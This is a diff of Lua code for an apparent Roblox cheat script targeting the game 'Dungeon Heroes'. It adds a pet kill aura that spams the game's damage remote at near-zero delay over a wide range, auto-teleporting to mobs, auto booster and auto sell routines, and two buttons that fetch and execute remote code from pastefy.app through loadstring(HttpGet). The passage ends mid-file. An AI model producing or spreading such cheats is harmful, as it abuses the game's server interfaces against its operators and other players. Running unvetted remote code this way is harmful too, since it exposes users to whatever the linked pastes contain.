+			local AtkRange = (RangeObj and tonumber(RangeObj.Value)) or 0
+			local AtkCooldown = (CooldownObj and tonumber(CooldownObj.Value)) or 0
+
+			for _, Child in ipairs(AttackFolder:GetChildren()) do
+				if Child:IsA("BasePart") and not Child:FindFirstChild("IsHeal") then
+					-- HitDamage check karo (default = 1)
+					local DmgObj = Child:FindFirstChild("HitDamage") or AttackFolder:FindFirstChild("HitDamage")
+					local HitDmg = (DmgObj and tonumber(DmgObj.Value)) or 1
+
+					-- Sabse zyada HitDamage wali skill chuno (Tie hone par zyada Range/Cooldown wali Heavy skill)
+					local IsBetter = false
+					if HitDmg > BestDamage then
+						IsBetter = true
+					elseif HitDmg == BestDamage then
+						if AtkRange > BestRange then
+							IsBetter = true
+						elseif AtkRange == BestRange and AtkCooldown > BestCooldown then
+							IsBetter = true
+						end
+					end
+
+					if IsBetter then
+						BestDamage = HitDmg
+						BestRange = AtkRange
+						BestCooldown = AtkCooldown
+						BestSkill = { AttackFolder.Name, Child.Name, HitDmg }
+					end
+				end
+			end
+		end
+	end
+
+	if BestSkill then
+		CachedBestAttack[PetName] = BestSkill
+		print(string.format("[Pet Kill Aura] %s -> Best Skill: %s (%s) | Skill Damage Mult: %s", PetName, BestSkill[1], BestSkill[2], tostring(BestSkill[3])))
+		return BestSkill
+	end
+
+	return nil
+end
+
+-- Check if mob is valid enemy
+local function IsValidEnemy(Mob, MyPet)
+	if Mob == MyPet then return false end
+
+	-- EXCEPTION: Completely ignore TargetDummy
+	if Mob.Name == "TargetDummy" then return false end
+
+	local Owner = Mob:GetAttribute("Owner")
+	if Owner ~= nil and Owner ~= "" then return false end
+
+	if string.find(Mob.Name, "Dummy") then return true end
+
+	local HP = tonumber(Mob:GetAttribute("HP"))
+	if HP ~= nil then return HP > 0 end
+
+	local Humanoid = Mob:FindFirstChildOfClass("Humanoid")
+	if Humanoid then return Humanoid.Health > 0 end
+
+	return true
+end
+
+-- Collect enemies in range
+local function GetTargets(HRP, MyPet)
+	local Targets = {}
+	local MobsFolder = GetMobsFolder()
+	if not MobsFolder then return Targets end
+
+	for _, Mob in ipairs(MobsFolder:GetChildren()) do
+		local MobHRP = Mob:FindFirstChild("HumanoidRootPart") or Mob.PrimaryPart
+		if MobHRP and IsValidEnemy(Mob, MyPet) then
+			local Distance = (MobHRP.Position - HRP.Position).Magnitude
+			if Distance <= CONFIG.KillRange then
+				table.insert(Targets, {
+					Instance = Mob,
+					Position = MobHRP.Position,
+					Distance = Distance
+				})
+			end
+		end
+	end
+
+	table.sort(Targets, function(a, b)
+		return a.Distance < b.Distance
+	end)
+
+	return Targets
+end
+
+-- Build hit clusters
+local function BuildHitClusters(TargetDataList)
+	local Clusters = {}
+	local Used = {}
+
+	for i, Primary in ipairs(TargetDataList) do
+		if not Used[i] then
+			Used[i] = true
+			local GroupInstances = { Primary.Instance }
+
+			for j = i + 1, #TargetDataList do
+				if not Used[j] then
+					local Secondary = TargetDataList[j]
+					if (Secondary.Position - Primary.Position).Magnitude <= CONFIG.ClusterRadius then
+						Used[j] = true
+						table.insert(GroupInstances, Secondary.Instance)
+					end
+				end
+			end
+
+			table.insert(Clusters, {
+				Mobs = GroupInstances,
+				Position = Primary.Position
+			})
+		end
+	end
+
+	return Clusters
+end
+
+-- Pet Aura Loop (Fires ONLY the #1 Best Skill)
+local function StartKillAura()
+	if not KillEnabled then return end
+
+	LoopId += 1
+	local CurrentId = LoopId
+
+	task.spawn(function()
+		while KillEnabled and LoopId == CurrentId do
+			local Character = LocalPlayer.Character
+			local HRP = Character and Character:FindFirstChild("HumanoidRootPart")
+
+			if HRP then
+				local Pet = GetMyPet()
+				local BestAttack = GetBestPetAttack(Pet)
+
+				if Pet and BestAttack then
+					local TargetData = GetTargets(HRP, Pet)
+
+					if #TargetData > 0 then
+						local Clusters = BuildHitClusters(TargetData)
+
+						for _, Cluster in ipairs(Clusters) do
+							if not KillEnabled or LoopId ~= CurrentId then
+								break
+							end
+
+							PetDamage:FireServer(
+								Pet,
+								BestAttack[1],
+								BestAttack[2],
+								Cluster.Mobs,
+								Cluster.Position
+							)
+						end
+					end
+				end
+			end
+
+			task.wait(CONFIG.AttackSpeed)
+		end
+	end)
+end
+
+-- ON/OFF Toggle
+MainTab:CreateToggle({
+	Name = "Pet Aura ( Lungsen recommended)",
+	CurrentValue = false,
+	Flag = "PetKillAura",
+	Callback = function(Value)
+		KillEnabled = Value
+		if Value then
+			StartKillAura()
+		else
+			LoopId += 1
+		end
+	end
+})
+
+-- Pet Kill Range
+MainTab:CreateSlider({
+	Name = "Pet Kill Range",
+	Range = {10, 300},
+	Increment = 5,
+	Suffix = "Studs",
+	CurrentValue = 200,
+	Flag = "PetKillRange",
+	Callback = function(Value)
+		CONFIG.KillRange = Value
+	end
+})
+
+-- Pet Attack Speed
+MainTab:CreateSlider({
+	Name = "Pet Attack Speed",
+	Range = {0.001, 1},
+	Increment = 0.01,
+	Suffix = "Seconds",
+	CurrentValue = 0.001,
+	Flag = "PetAttackSpeed",
+	Callback = function(Value)
+		CONFIG.AttackSpeed = Value
+	end
+})
+
+
+-- ==========================================
+-- SCRIPT LOADERS (FOLLOW PLAYER & EMOTE V2)
+-- ==========================================
+MiscellaneousTab:CreateSection("Script Loaders")
+
+MiscellaneousTab:CreateButton({
+Name = "Follow Player",
+Callback = function()
+Rayfield:Notify({
+Title = "Script By Sid",
+Content = "Loading Follow Player...",
+Duration = 2,
+Image = 4483362458,
+})
+
+task.spawn(function()  
+        local ok, err = pcall(function()  
+            loadstring(game:HttpGet("https://pastefy.app/OZaP94pM/raw"))()  
+        end)  
+
+        if ok then  
+            Rayfield:Notify({  
+                Title = "Script By Sid",  
+                Content = "Follow Player Loaded ✓",  
+                Duration = 3,  
+                Image = 4483362458,  
+            })  
+        else  
+            warn("Follow Player Script Error:", err)  
+        end  
+    end)  
+end,
+
+})
+
+MiscellaneousTab:CreateButton({
+Name = "Emote V2",
+Callback = function()
+Rayfield:Notify({
+Title = "Script By Sid",
+Content = "Loading Emote V2...",
+Duration = 2,
+Image = 4483362458,
+})
+
+task.spawn(function()  
+        local ok, err = pcall(function()  
+            loadstring(game:HttpGet("https://pastefy.app/t7kwsYZn/raw"))()  
+        end)  
+
+        if ok then  
+            Rayfield:Notify({  
+                Title = "Script By Sid",  
+                Content = "Emote V2 Loaded ✓",  
+                Duration = 3,  
+                Image = 4483362458,  
+            })  
+        else  
+            warn("Emote V2 Script Error:", err)  
+        end  
+    end)  
+end,
+
+})
+
+UtilityTab:CreateSection("Tween Mobs")
+
+
+--========================================================
+-- DUNGEON HEROES | AUTO MOBS + PET LOCK V3
+-- Full Dungeon Scan | Movable Platform Release
+-- TargetDummy Ignored | Pet Follow Only With Valid Mob
+--========================================================
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local Player = Players.LocalPlayer
+
+-- CONFIGURATION
+local FloatHeight = 30
+local MoveSpeed = 250
+local UpdateRate = 0.03
+
+local PetOffset = Vector3.new(3, 2, 0)
+
+local PlatformSize = Vector3.new(7, 1, 7)
+local PlatformOffset = 3.5
+
+local AutoMobs = false
+local RunId = 0
+
+local MovementConnection = nil
+local SupportPlatform = nil
+
+-- CHARACTER
+local function GetCharacter()
+    return Player.Character
+end
+
+local function GetHRP()
+    local Character = GetCharacter()
+    return Character and Character:FindFirstChild("HumanoidRootPart")
+end
+
+-- EQUIPPED PET
+local function GetMyPet()
+    local MobsFolder = workspace:FindFirstChild("Mobs")
+    if not MobsFolder then return nil end
+
+    for _, Mob in ipairs(MobsFolder:GetChildren()) do
+        if Mob:GetAttribute("Owner") == Player.Name then
+            return Mob
+        end
+    end
+
+    return nil
+end
+
+-- PET ROOT
+local function GetPetRoot(Pet)
+    if not Pet then return nil end
+
+    if Pet:IsA("BasePart") then
+        return Pet
+    end
+
+    if Pet:IsA("Model") then
+        return Pet:FindFirstChild("HumanoidRootPart")
+            or Pet.PrimaryPart
+            or Pet:FindFirstChildWhichIsA("BasePart", true)
+    end
+
+    return nil
+end
+
+-- PET FOLLOW
+local function LockPetToPlayer(Root)
+    local Pet = GetMyPet()
+    if not Pet or not Pet.Parent then return end
+
+    local PetRoot = GetPetRoot(Pet)
+    if not PetRoot then return end
+
+    local TargetPosition =
+        Root.CFrame:PointToWorldSpace(PetOffset)
+
+    local Difference = TargetPosition - PetRoot.Position
+
+    if Pet:IsA("Model") then
+        Pet:PivotTo(Pet:GetPivot() + Difference)
+
+    elseif Pet:IsA("BasePart") then
+        Pet.CFrame =
+            CFrame.new(TargetPosition) * Pet.CFrame.Rotation
+    end
+end
+
+-- CREATE PLATFORM
+local function CreatePlatform(Root)
+    if SupportPlatform and SupportPlatform.Parent then
+        SupportPlatform.Anchored = true
+        SupportPlatform.CanCollide = true
+
+        SupportPlatform.CFrame = CFrame.new(
+            Root.Position - Vector3.new(0, PlatformOffset, 0)
+        )
+
+        return
+    end
+
+    local Platform = Instance.new("Part")
+
+    Platform.Name = "AutoMobs_SupportPlatform"
+    Platform.Size = PlatformSize
+    Platform.Anchored = true
+    Platform.CanCollide = true
+    Platform.CanTouch = false
+    Platform.CanQuery = false
+
+    Platform.Transparency = 0.35
+    Platform.Material = Enum.Material.ForceField
+    Platform.Color = Color3.fromRGB(130, 80, 255)
+
+    Platform.CFrame = CFrame.new(
+        Root.Position - Vector3.new(0, PlatformOffset, 0)
+    )
+
+    Platform.Parent = workspace
+    SupportPlatform = Platform
+end
+
+-- RELEASE PLATFORM
+-- Platform remains under player but becomes movable
+local function ReleasePlatform()
+    if SupportPlatform and SupportPlatform.Parent then
+        SupportPlatform.Anchored = false
+        SupportPlatform.CanCollide = true
+    end
+end
+
+-- FIND NEAREST MOB IN ENTIRE DUNGEON
+local function GetNearestMob()
+    local Root = GetHRP()
+    if not Root then return nil end
+
+    local MobsFolder = workspace:FindFirstChild("Mobs")
+    if not MobsFolder then return nil end
+
+    local NearestMob = nil
+    local ShortestDistance = math.huge
+
+    for _, Mob in ipairs(MobsFolder:GetChildren()) do
+
+        local Owner = Mob:GetAttribute("Owner")
+        local HP = Mob:GetAttribute("HP")
+
+        -- Ignore TargetDummy and owned pets
+        if Mob.Name ~= "TargetDummy"
+            and (Owner == nil or Owner == "")
+        then
+
+            local MobRoot =
+                Mob:FindFirstChild("HumanoidRootPart")
+                or Mob.PrimaryPart
+
+            local ValidHP = HP == nil
+                or (tonumber(HP) ~= nil and tonumber(HP) > 0)
+
+            if MobRoot and ValidHP then
+
+                local Distance =
+                    (MobRoot.Position - Root.Position).Magnitude
+
+                if Distance < ShortestDistance then
+                    ShortestDistance = Distance
+                    NearestMob = Mob
+                end
+            end
+        end
+    end
+
+    return NearestMob
+end
+
+-- STOP
+local function StopAutoMobs()
+    AutoMobs = false
+    RunId += 1
+
+    if MovementConnection then
+        MovementConnection:Disconnect()
+        MovementConnection = nil
+    end
+
+    -- Do not destroy platform; release it for normal movement
+    ReleasePlatform()
+end
+
+-- START
+local function StartAutoMobs()
+    StopAutoMobs()
+
+    RunId += 1
+    local CurrentRun = RunId
+
+    local Root = GetHRP()
+    if not Root then return end
+
+    AutoMobs = true
+
+    local Elapsed = 0
+
+    MovementConnection = RunService.Heartbeat:Connect(function(DeltaTime)
+
+        if not AutoMobs or RunId ~= CurrentRun then
+            return
+        end
+
+        Elapsed += DeltaTime
+
+        if Elapsed < UpdateRate then
+            return
+        end
+
+        local StepTime = math.min(Elapsed, 0.1)
+        Elapsed = 0
+
+        pcall(function()
+
+            local Character = GetCharacter()
+
+            local Root = Character
+                and Character:FindFirstChild("HumanoidRootPart")
+
+            local Humanoid = Character
+                and Character:FindFirstChildOfClass("Humanoid")
+
+            if not Root or not Humanoid or Humanoid.Health <= 0 then
+                return
+            end
+
+            -- SEARCH ENTIRE DUNGEON
+            local Mob = GetNearestMob()
+
+            -- NO VALID MOB ANYWHERE
+            if not Mob then
+                -- Stop pet follow and movement.
+                -- Keep platform, but make it movable.
+                ReleasePlatform()
+                return
+            end
+
+            -- VALID MOB FOUND
+            local MobRoot =
+                Mob:FindFirstChild("HumanoidRootPart")
+                or Mob.PrimaryPart
+
+            if not MobRoot then
+                ReleasePlatform()
+                return
+            end
+
+            -- CREATE OR RE-ANCHOR PLATFORM
+            CreatePlatform(Root)
+
+            -- MOVE ABOVE MOB
+            local TargetPosition =
+                MobRoot.Position
+                + Vector3.new(0, FloatHeight, 0)
+
+            -- SMOOTH MOVEMENT
+            local Difference =
+                TargetPosition - Root.Position
+
+            local Distance = Difference.Magnitude
+
+            if Distance > 0.1 then
+
+                local Step = math.min(
+                    MoveSpeed * StepTime,
+                    Distance
+                )
+
+                local NewPosition =
+                    Root.Position + Difference.Unit * Step
+
+                Root.CFrame =
+                    CFrame.new(NewPosition)
+                    * Root.CFrame.Rotation
+            end
+
+            -- PLATFORM UNDER PLAYER
+            if SupportPlatform and SupportPlatform.Parent then
+                SupportPlatform.CFrame = CFrame.new(
+                    Root.Position - Vector3.new(0, PlatformOffset, 0)
+                )
+            end
+
+            -- PET FOLLOWS ONLY WHEN VALID MOB EXISTS
+            LockPetToPlayer(Root)
+
+        end)
+    end)
+end
+
+-- MAIN TOGGLE
+UtilityTab:CreateToggle({
+    Name = "Auto Mobs",
+    CurrentValue = false,
+    Flag = "AutoMobsToggle",
+
+    Callback = function(Value)
+        if Value then
+            StartAutoMobs()
+        else
+            StopAutoMobs()
+        end
+    end
+})
+
+-- FLOAT HEIGHT
+UtilityTab:CreateSlider({
+    Name = "Mob Float Height",
+    Range = {10, 200},
+    Increment = 1,
+    Suffix = "Studs",
+    CurrentValue = 30,
+    Flag = "MobFloatHeight",
+
+    Callback = function(Value)
+        FloatHeight = Value
+    end
+})
+
+-- MOVEMENT SPEED
+UtilityTab:CreateSlider({
+    Name = "Movement Speed",
+    Range = {100, 1000},
+    Increment = 25,
+    Suffix = "Speed",
+    CurrentValue = 250,
+    Flag = "MovementSpeed",
+
+    Callback = function(Value)
+        MoveSpeed = Value
+    end
+})
+
+-- RESPAWN CLEANUP
+Player.CharacterAdded:Connect(function()
+    if AutoMobs then
+        StopAutoMobs()
+    end
+
+    if SupportPlatform then
+        SupportPlatform:Destroy()
+        SupportPlatform = nil
+    end
+end)
+
+
+UtilityTab:CreateSection("Auto Booster")
+
+-- Dungeon Heroes | Auto Booster
+-- Auto Refresh + Favorite Protection
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+
+local Player = Players.LocalPlayer
+local Items = require(RS.Systems.Items)
+
+local ActivateBooster = RS:WaitForChild("Remotes"):WaitForChild("ActivateBooster")
+
+local AutoEnabled = false
+local WorkerId = 0
+local SentCount = {}
+
+-- Get Inventory
+local function GetInventory()
+return Items:GetPlayerItemFolder(Player, "Inventory")
+end
+
+-- Scan Boosters
+local function ScanBoosters()
+local Inventory = GetInventory()
+if not Inventory then return end
+
+for _, item in ipairs(Inventory:GetChildren()) do  
+    if not AutoEnabled then break end  
+
+    local success, err = pcall(function()  
+        local itemData = Items:GetItemData(item.Name)  
+
+        if not itemData or itemData.Category ~= "Booster" then  
+            return  
+        end  
+
+        -- Favorite Protection  
+        if Items:ItemIsFavorited(item) then  
+            return  
+        end  
+
+        -- Get UID  
+        local uid = Items:ItemRefForRemote(item)  
+
+        if typeof(uid) ~= "string" or uid == "" then  
+            return  
+        end  
+
+        -- Get Count  
+        local countObject = item:FindFirstChild("Count")  
+        local totalCount = countObject and countObject.Value or 1  
+
+        local alreadySent = SentCount[uid] or 0  
+
+        while alreadySent < totalCount and AutoEnabled do  
+            if Items:ItemIsFavorited(item) then  
+                break  
+            end  
+
+            ActivateBooster:FireServer(uid)  
+
+            alreadySent += 1  
+            SentCount[uid] = alreadySent  
+
+            task.wait(0.5)  
+        end  
+    end)  
+
+    if not success then  
+        warn("[Auto Booster]", err)  
+    end  
+end
+
+end
+
+UtilityTab:CreateToggle({
+Name = "Auto Activate Boosters",
+CurrentValue = false,
+Flag = "AutoBooster",
+
+Callback = function(Value)  
+    AutoEnabled = Value  
+    WorkerId += 1  
+
+    if Value then  
+        local thisWorker = WorkerId  
+
+        task.spawn(function()  
+            while AutoEnabled and WorkerId == thisWorker do  
+                ScanBoosters()  
+                task.wait(1)  
+            end  
+        end)  
+    end  
+end
+
+})
+
+
+--====================================================
+-- DUNGEON HEROES | PET LOCK ONLY
+-- Separate Rayfield UI | One Toggle Only
+-- Default Pet Position | Smooth Follow
+--====================================================
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local Player = Players.LocalPlayer
+
+local PetLockEnabled = false
+local Connection = nil
+
+-- DEFAULT FOLLOW POSITION
+local PetOffset = Vector3.new(3, 2, 0)
+
+-- GET EQUIPPED PET
+local function GetMyPet()
+    local Folder = workspace:FindFirstChild("Mobs")
+    if not Folder then return nil end
+
+    for _, Mob in ipairs(Folder:GetChildren()) do
+        if Mob:GetAttribute("Owner") == Player.Name then
+            return Mob
+        end
+    end
+
+    return nil
+end
+
+-- GET PET ROOT
+local function GetPetRoot(Pet)
+    if not Pet then return nil end
+
+    if Pet:IsA("BasePart") then
+        return Pet
+    end
+
+    if Pet:IsA("Model") then
+        return Pet:FindFirstChild("HumanoidRootPart")
+            or Pet.PrimaryPart
+            or Pet:FindFirstChildWhichIsA("BasePart", true)
+    end
+
+    return nil
+end
+
+-- SMOOTH PET FOLLOW
+local function FollowPet(DeltaTime)
+    local Character = Player.Character
+    local PlayerRoot = Character
+        and Character:FindFirstChild("HumanoidRootPart")
+
+    if not PlayerRoot then return end
+
+    local Pet = GetMyPet()
+    if not Pet or not Pet.Parent then return end
+
+    local PetRoot = GetPetRoot(Pet)
+    if not PetRoot then return end
+
+    local TargetPosition =
+        PlayerRoot.CFrame:PointToWorldSpace(PetOffset)
+
+    local CurrentPivot
+
+    if Pet:IsA("Model") then
+        CurrentPivot = Pet:GetPivot()
+    else
+        CurrentPivot = Pet.CFrame
+    end
+
+    local TargetPivot =
+        CFrame.new(TargetPosition) * CurrentPivot.Rotation
+
+    local Alpha = 1 - math.exp(-20 * DeltaTime)
+    local NewPivot = CurrentPivot:Lerp(TargetPivot, Alpha)
+
+    if Pet:IsA("Model") then
+        Pet:PivotTo(NewPivot)
+    else
+        Pet.CFrame = NewPivot
+    end
+end
+
+-- ONLY TOGGLE
+MiscellaneousTab:CreateToggle({
+    Name = "Pet Lock",
+    CurrentValue = false,
+    Flag = "PetLockOnly",
+
+    Callback = function(Value)
+        PetLockEnabled = Value
+
+        if Connection then
+            Connection:Disconnect()
+            Connection = nil
+        end
+
+        if Value then
+            Connection = RunService.Heartbeat:Connect(function(DeltaTime)
+                if not PetLockEnabled then return end
+
+                pcall(function()
+                    FollowPet(DeltaTime)
+                end)
+            end)
+        end
+    end
+})
+
+-- RESPAWN CLEANUP
+Player.CharacterAdded:Connect(function()
+    if Connection then
+        Connection:Disconnect()
+        Connection = nil
+    end
+
+    PetLockEnabled = false
+end)
+
+UtilityTab:CreateSection("Auto Sell")
+do
+
+-- Dungeon Heroes | Advanced Auto Sell
+-- Title Duplicate Fix + Gear Detection Fix
+-- Original working logic preserved
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+
+local Player = Players.LocalPlayer
+
+local Items = require(RS.Systems.Items)
+local ItemSelling = require(RS.Systems.ItemSelling)
+local ProfileSystem = require(RS.Systems.Profile)
+
+-- Settings
+local AutoSellEnabled = false
+local DuplicateSellEnabled = false
+
+local ScanDelay = 0.1
+local SellCooldown = 1
+local LastSellTime = 0
+
+local SelectedCategory = "Gear"
+local SelectedFilter = {kind = "gear"}
+
+local RarityConfig = {
+[1] = false,
+[2] = false,
+[3] = false,
+[4] = false,
+[5] = false,
+[6] = false,
+[9] = false,
+}
+
+-- ==========================================
+-- TITLE DETECTION
+-- ==========================================
+
+local function IsTitleData(Data, ID)
+return Data ~= nil
+and Data.Category == "Cosmetic"
+and Data.Type == "Title"
+end
+
+-- ==========================================
+-- DYNAMIC CATEGORY OPTIONS
+-- ==========================================
+
+local ItemList = Items:GetItemList()
+
+local CategoryOptions = {"Gear", "Title"}
+
+local FilterMap = {
+["Gear"] = {kind = "gear"},
+["Title"] = {kind = "title"}
+}
+
+local CosmeticTypes = {}
+
+for ID, Data in pairs(ItemList) do
+
+if type(Data) ~= "table" then  
+    continue  
+end  
+
+local Category = Data.Category  
+
+if Category == "Weapon" or Category == "Armor" then  
+    continue  
+end  
+
+if Category == "Cosmetic" then  
+
+    local Type = Data.Type or "Other"  
+
+    if Type ~= "Title" then  
+        CosmeticTypes[Type] = true  
+    end  
+
+elseif type(Category) == "string" then  
+
+    if Category ~= "Title" then  
+        FilterMap[Category] = {  
+            kind = "category",  
+            category = Category  
+        }  
+    end  
+end
+
+end
+
+local CosmeticTypeNames = {
+Title = "Title",
+Aura = "Aura",
+WeaponCosmetic = "Weapon Cosmetic",
+ShirtCosmetic = "Shirt",
+PantsCosmetic = "Pants",
+}
+
+for Type in pairs(CosmeticTypes) do
+
+local Label = "Cosmetic: " ..  
+    (CosmeticTypeNames[Type] or Type)  
+
+FilterMap[Label] = {  
+    kind = "cosmetic",  
+    cosmeticType = Type  
+}  
+
+table.insert(CategoryOptions, Label)
+
+end
+
+for Category in pairs(FilterMap) do
+
+if Category ~= "Gear"  
+and Category ~= "Title"  
+and not string.find(Category, "Cosmetic: ", 1, true) then  
+
+    table.insert(CategoryOptions, Category)  
+end
+
+end
+
+table.sort(CategoryOptions, function(a, b)
+
+if a == "Gear" then return true end  
+if b == "Gear" then return false end  
+
+if a == "Title" then return true end  
+if b == "Title" then return false end  
+
+return a < b
+
+end)
+
+-- ==========================================
+-- RAYFIELD WINDOW
+-- ==========================================
+
+UtilityTab:CreateToggle({
+Name = "Auto Sell",
+CurrentValue = false,
+Flag = "AutoSellMaster",
+
+Callback = function(Value)  
+    AutoSellEnabled = Value  
+    print("Auto Sell:", Value)  
+end
+
+})
+
+UtilityTab:CreateToggle({
+Name = "Duplicate Sell",
+CurrentValue = false,
+Flag = "DuplicateSell",
+
+Callback = function(Value)  
+    DuplicateSellEnabled = Value  
+    print("Duplicate Sell:", Value)  
+end
+
+})
+
+UtilityTab:CreateDropdown({
+Name = "Select Category",
+Options = CategoryOptions,
+CurrentOption = "Gear",
+MultipleOptions = false,
+Flag = "AutoSellCategory",
+
+Callback = function(Option)  
+
+    if type(Option) == "table" then  
+        Option = Option[1]  
+    end  
+
+    if not Option or not FilterMap[Option] then  
+        return  
+    end  
+
+    SelectedCategory = Option  
+    SelectedFilter = FilterMap[Option]  
+
+    print("Category:", Option)  
+end
+
+})
+
+-- ==========================================
+-- RARITY TOGGLES
+-- ==========================================
+
+UtilityTab:CreateSection("Rarity Settings")
+
+local Rarities = {
+{Name = "Common", ID = 1},
+{Name = "Uncommon", ID = 2},
+{Name = "Rare", ID = 3},
+{Name = "Epic", ID = 4},
+{Name = "Legendary", ID = 5},
+{Name = "Mythic", ID = 6},
+{Name = "Nightmare", ID = 9},
+}
+
+for _, Rarity in ipairs(Rarities) do
+
+UtilityTab:CreateToggle({  
+    Name = "Sell " .. Rarity.Name,  
+    CurrentValue = false,  
+    Flag = "Rarity_" .. Rarity.Name,  
+
+    Callback = function(Value)  
+        RarityConfig[Rarity.ID] = Value  
+    end  
+})
+
+end
+
+-- ==========================================
+-- ITEM INFORMATION
+-- ==========================================
+
+local function GetInfo(Item)
+
+local Success, Result = pcall(function()  
+
+    local ID = Items:GetItemId(Item)  
+    if not ID then return nil end  
+
+    local Data = Items:GetItemData(ID)  
+    if not Data then return nil end  
+
+    return {  
+        ID = ID,  
+        Data = Data,  
+        Rarity = Items:GetRarity(Item)  
+    }  
+end)  
+
+if not Success then  
+    return nil  
+end  
+
+return Result
+
+end
+
+-- ==========================================
+-- FAVORITE / SEALED PROTECTION
+-- ==========================================
+
+local function IsProtected(Item)
+
+local Success, Favorite = pcall(function()  
+    return Items:ItemIsFavorited(Item)  
+end)  
+
+if not Success or Favorite then  
+    return true  
+end  
+
+if typeof(Item) == "Instance" then  
+
+    if Item:FindFirstChild("Sealed") then  
+        return true  
+    end  
+
+elseif typeof(Item) == "table" then  
+
+    if Item.sealed == true then  
+        return true  
+    end  
+end  
+
+return false
+
+end
+
+-- ==========================================
+-- DYE IDENTIFICATION
+-- ==========================================
+
+local function GetDye(Item)
+
+if typeof(Item) == "Instance" then  
+
+    local Dye = Item:FindFirstChild("Dye")  
+
+    if Dye and Dye:IsA("StringValue") then  
+        return Dye.Value  
+    end  
+
+    return ""  
+end  
+
+if typeof(Item) == "table" then  
+    return Item.dye or ""  
+end  
+
+return ""
+
+end
+
+-- ==========================================
+-- LEVEL IDENTIFICATION
+-- ==========================================
+
+local function GetSkillLevel(Item)
+
+local Success, Level = pcall(function()  
+    return Items:GetLevel(Item)  
+end)  
+
+if Success then  
+    return tonumber(Level) or 1  
+end  
+
+return 1
+
+end
+
+local function GetSeasonLevel(Item)
+
+local Success, Level = pcall(function()  
+    return Items:GetSeasonalLevel(Item)  
+end)  
+
+if Success then  
+    return tonumber(Level) or 1  
+end  
+
+return 1
+
+end
+
+local function GetCount(Item)
+
+if typeof(Item) == "Instance" then  
+
+    local Count = Item:FindFirstChild("Count")  
+
+    if Count then  
+        return math.max(1, tonumber(Count.Value) or 1)  
+    end  
+
+elseif typeof(Item) == "table" then  
+
+    return math.max(1, tonumber(Item.count) or 1)  
+end  
+
+return 1
+
+end
+
+-- ==========================================
+-- CATEGORY MATCHING
+-- ==========================================
+
+local function IsGear(Data)
+
+return Data.Category == "Weapon"  
+    or Data.Category == "Armor"
+
+end
+
+local function MatchesCategory(Data, ID)
+
+if SelectedFilter.kind == "gear" then  
+    return IsGear(Data)  
+end  
+
+-- FIXED TITLE MATCHING  
+if SelectedFilter.kind == "title" then  
+    return IsTitleData(Data, ID)  
+end  
+
+if SelectedFilter.kind == "cosmetic" then  
+
+    return Data.Category == "Cosmetic"  
+        and Data.Type == SelectedFilter.cosmeticType  
+        and not IsTitleData(Data, ID)  
+end  
+
+if SelectedFilter.kind == "category" then  
+
+    return Data.Category == SelectedFilter.category  
+        or Data.SortCategory == SelectedFilter.category  
+end  
+
+return false
+
+end
+
+-- ==========================================
+-- COLLECT ITEMS
+-- ==========================================
+
+local function CollectItems()
+
+local Collected = {}  
+local Seen = {}  
+
+-- ======================================  
+-- GEAR COLLECTION  
+-- Original working Stats Folder logic  
+-- ======================================  
+
+if SelectedFilter.kind == "gear" then  
+
+    local Profile = ProfileSystem:GetProfile(Player)  
+    if not Profile then  
+        return Collected  
+    end  
+
+    local Inventory = Profile:FindFirstChild("Inventory")  
+    if not Inventory then  
+        return Collected  
+    end  
+
+    for _, Item in ipairs(Inventory:GetChildren()) do  
+
+        local Stats = Item:FindFirstChild("Stats")  
+        local IsGearItem = Stats and Stats:IsA("Folder")  
+
+        if IsGearItem then  
+
+            -- Favorite Protection  
+            local IsFavorite = false  
+
+            local Success, Result = pcall(function()  
+                return Items:ItemIsFavorited(Item)  
+            end)  
+
+            if Success and Result then  
+                IsFavorite = true  
+            end  
+
+            local Favorite = Item:FindFirstChild("Favorite")  
+
+            if Favorite and Favorite.Value == true then  
+                IsFavorite = true  
+            end  
+
+            -- Sealed Protection  
+            if Item:FindFirstChild("Sealed") then  
+                IsFavorite = true  
+            end  
+
+            -- Rarity Check  
+            local RarityValue = Item:FindFirstChild("Rarity")  
+            local RarityID = RarityValue and RarityValue.Value or 1  
+
+            local ShouldSell = RarityConfig[RarityID] == true  
+
+            if not IsFavorite and ShouldSell then  
+
+                table.insert(Collected, {  
+                    Item = Item,  
+                    Protected = false,  
+                    Rarity = RarityID,  
+                    Count = 1,  
+                    IsTitle = false  
+                })  
+            end  
+        end  
+    end  
+
+    return Collected  
+end  
+
+-- ======================================  
+-- ORIGINAL COLLECTION LOGIC  
+-- Other categories unchanged  
+-- ======================================  
+
+local function AddItem(Item)  
+
+    if not Item or Seen[Item] then  
+        return  
+    end  
+
+    Seen[Item] = true  
+
+    local Info = GetInfo(Item)  
+    if not Info then return end  
+
+    local Data = Info.Data  
+
+    if Items:ItemIsUntradeable(Data)  
+    and not IsTitleData(Data, Info.ID) then  
+        return  
+    end  
+
+    if not MatchesCategory(Data, Info.ID) then  
+        return  
+    end  
+
+    if RarityConfig[Info.Rarity] ~= true then  
+        return  
+    end  
+
+    local Entry = {  
+        Item = Item,  
+        ID = Info.ID,  
+        Data = Data,  
+        Rarity = Info.Rarity,  
+        Count = GetCount(Item),  
+        Protected = IsProtected(Item),  
+        IsTitle = IsTitleData(Data, Info.ID),  
+    }  
+
+    if Data.Category == "Skill" then  
+        Entry.Level = GetSkillLevel(Item)  
+        Entry.SeasonalLevel = GetSeasonLevel(Item)  
+    end  
+
+    if Data.Category == "Cosmetic" then  
+        Entry.Dye = GetDye(Item)  
+        Entry.Type = Data.Type or "Other"  
+    end  
+
+    table.insert(Collected, Entry)  
+end  
+
+-- Inventory  
+local Inventory = Items:GetPlayerItemFolder(  
+    Player, "Inventory"  
+)  
+
+if Inventory then  
+    for _, Item in ipairs(Inventory:GetChildren()) do  
+        AddItem(Item)  
+    end  
+end  
+
+-- Pets  
+local Pets = Items:GetPlayerItemFolder(  
+    Player, "Pets"  
+)  
+
+if Pets then  
+    for _, Item in ipairs(Pets:GetChildren()) do  
+        AddItem(Item)  
+    end  
+end  
+
+-- Cosmetics records  
+local Success, Cosmetics = pcall(function()  
+    return Items:GetTableItems(Player, "Cosmetics")  
+end)  
+
+if Success and type(Cosmetics) == "table" then  
+
+    for _, Item in pairs(Cosmetics) do  
+        AddItem(Item)  
+    end  
+end  
+
+return Collected
+
+end
+
+-- ==========================================
+-- DUPLICATE GROUP KEY
+-- ==========================================
+
